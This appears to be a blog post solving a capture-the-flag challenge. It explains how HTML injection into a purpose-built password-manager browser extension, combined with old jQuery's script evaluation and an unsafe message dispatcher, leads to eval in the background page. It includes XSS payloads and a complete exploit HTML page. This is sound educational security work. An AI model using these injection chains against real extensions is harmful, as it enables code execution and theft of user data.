@@ -1,0 +1,72 @@
+{"title": "BBN challenge resolution: Getting the flag from a browser extension", "date": "2018-12-17 11:37:49", "description": "\"Can you get the flag from this browser extension?\" challenge requires you to find a way into the extension's background page. Answer revealed here.", "categories": ["security", "challenge"], "slug": "bbn-challenge-resolution-getting-the-flag-from-a-browser-extension"}
+
+<p>My so far last BugBountyNotes challenge is called <a href="https://www.bugbountynotes.com/challenge?id=23">Can you get the flag from this browser extension?</a>. Unlike the <a href="/2018/12/10/bbn-challenge-resolution-exploiting-the-screenshotterpro-browser-extension">previous one</a>, this isn&#8217;t about exploiting logical errors but the more straightforward Remote Code Execution. The goal is running your code in the context of the extension&#8217;s background page in order to extract the flag variable stored there.</p>
+
+<p>If you haven&#8217;t looked at this challenge yet, feel free to stop reading at this point and go try it out. Mind you, this one is hard and only two people managed to solve it so far. Note also that I won&#8217;t look at any answers submitted at this point any more. Of course, you can also participate in any of the <a href="https://www.bugbountynotes.com/training">ongoing challenges</a> as well.</p>
+
+<p>Still here? Ok, I&#8217;m going to explain this challenge then.</p>
+
+<h4>The obvious vulnerability</h4>
+
+<p>This browser extension is a minimalist password manager: it doesn&#8217;t bother storing passwords, only login names. And the vulnerability is of a very common type: when generating <span class="caps">HTML</span> code, this extension forgets to escape <span class="caps">HTML</span> entities in the logins:</p>
+
+<pre><code>      for (let login of logins)
+        html += `&lt;li&gt;&lt;a href=&quot;#&quot; data-value=&quot;${login}&quot;&gt;${login}&lt;/a&gt;&lt;/li&gt;`;</code></pre>
+
+<p>Since the website can fill out and submit a form programmatically, it can make this extension remember whichever login it wants. Making the extension store something like <code>login&lt;img src=x onerror=alert(1)&gt;</code> will result in JavaScript code executing whenever the user opens the website in future. Trouble is: the code executes in the context of the same website that injected this code in the first place, so nothing is gained by that.</p>
+
+<h4>Getting into the content script</h4>
+
+<p>What you&#8217;d really want is having your script run within the content script of the extension. There is an interesting fact: if you call <code>eval()</code> in a content script, code will be evaluated in the context of the content script rather than website context. This happens even if the extension&#8217;s content security policy forbids eval: content security policy only applies to extension pages, not to its content scripts. Why the browser vendors don&#8217;t tighten security here is beyond me.</p>
+
+<p>And now comes something very non-obvious. The <span class="caps">HTML</span> code is being inserted using the following:</p>
+
+<pre><code>$container = $(html);
+$login.parent().prepend($container);</code></pre>
+
+<p>One would think that jQuery uses <code>innerHTML</code> or its moral equivalent here but that&#8217;s not actually true. <code>innerHTML</code> won&#8217;t execute JavaScript code within <code>&lt;script&gt;</code> tags, so jQuery is being “helpful” and executing that code separately. Newer jQuery versions will add a <code>&lt;script&gt;</code> tag to the <span class="caps">DOM</span> temporarily but the versions before jQuery 2.1.2 will essentially call <code>eval()</code>. Bingo!</p>
+
+<p>So your payload has to be something like <code>login&lt;script&gt;alert(1)&lt;/script&gt;</code>, this way your code will run in the context of the content script.</p>
+
+<h4>Getting from the content script to the background page</h4>
+
+<p>The content script can only communicate with the background page via messaging. And the background page only supports two commands: <code>getLogins</code> and <code>addLogin</code>. Neither will allow you to extract the flag or inject code.</p>
+
+<p>But the way the background page translates message types into handlers is remarkable:</p>
+
+<pre><code>window[message.type].apply(window, message.params)</code></pre>
+
+<p>If you look closely, you are not restricted by the handler functions defined in the background page, any global JavaScript function will do! And there is one particularly useful function called <code>eval()</code>. So your message has to look like this to extract the flag: <code>{type: &#39;eval&#39;, params: [&#39;console.log(FLAG)&#39;]}</code>. There you go, you have code running in the background page that can extract the flag or do just about anything.</p>
+
+<h4>The complete solution</h4>
+
+<p>So here is my complete solution. As usually, this is only one way of doing it.</p>
+
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;Safe Login Storage solution&lt;/title&gt;
+    &lt;script&gt;
+      window.addEventListener(&quot;load&quot;, event =&gt;
+      {
+        window.setTimeout(() =&gt;
+        {
+          let container = document.getElementById(&quot;logins-container&quot;);
+          if (!container || !container.querySelector(&quot;[data-value^=&#39;boom&#39;]&quot;))
+          {
+            document.getElementById(&quot;username&quot;).value = &quot;boom&lt;script&gt;chrome.runtime.sendMessage({type: &#39;eval&#39;, params: [&#39;console.log(FLAG)&#39;]})&lt;\/script&gt;&quot;;
+            document.getElementById(&quot;submit&quot;).click();
+            window.location.reload();
+          }
+        }, 2000);
+      });
+    &lt;/script&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;form action=&quot;javascript:void(0)&quot; hidden&gt;
+      &lt;input id=&quot;username&quot;&gt;
+      &lt;input id=&quot;submit&quot; type=&quot;submit&quot;&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
